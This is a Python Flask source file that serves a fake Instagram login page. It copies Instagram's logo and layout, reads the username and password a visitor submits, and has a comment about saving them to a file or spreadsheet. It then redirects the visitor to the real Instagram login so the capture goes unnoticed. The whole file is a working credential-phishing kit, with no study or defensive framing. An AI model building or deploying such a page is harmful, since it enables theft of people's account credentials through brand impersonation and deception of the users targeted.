from flask import Flask, request, redirect, render_template_string

app = Flask(__name__)

html_page = """
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Instagram</title>
  <style>
    body {
      background-color: #fafafa;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto;
    }
    .container {
      background-color: white;
      border: 1px solid #dbdbdb;
      padding: 40px 30px;
      width: 100%;
      max-width: 320px;
      box-shadow: 0 0 10px rgba(0,0,0,0.05);
      text-align: center;
    }
    .logo {
      width: 175px;
      margin: 0 auto 20px;
    }
    input {
      width: 100%;
      padding: 10px;
      margin: 5px 0;
      background: #fafafa;
      border: 1px solid #dbdbdb;
      border-radius: 3px;
      font-size: 14px;
    }
    button {
      width: 100%;
      background-color: #3897f0;
      color: white;
      padding: 10px;
      border: none;
      font-weight: bold;
      border-radius: 4px;
      margin-top: 10px;
    }
    .signup {
      margin-top: 20px;
      font-size: 14px;
    }
    .signup a {
      color: #3897f0;
      text-decoration: none;
    }
  </style>
</head>
<body>
  <form method="POST">
    <div class="container">
      <img src="https://1000logos.net/wp-content/uploads/2017/02/Instagram-Logo.png" class="logo">
      <input type="text" name="username" placeholder="Phone number, username, or email" required>
      <input type="password" name="password" placeholder="Password" required>
      <button type="submit">Log In</button>
      <div class="signup">
        Don’t have an account? <a href="#">Sign up</a>
      </div>
    </div>
  </form>
</body>
</html>
"""

@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")

        # Optionally save to file or Sheets here

        # Redirect to real Instagram after form is submitted
        return redirect("https://www.instagram.com/accounts/login/")
    return render_template_string(html_page)

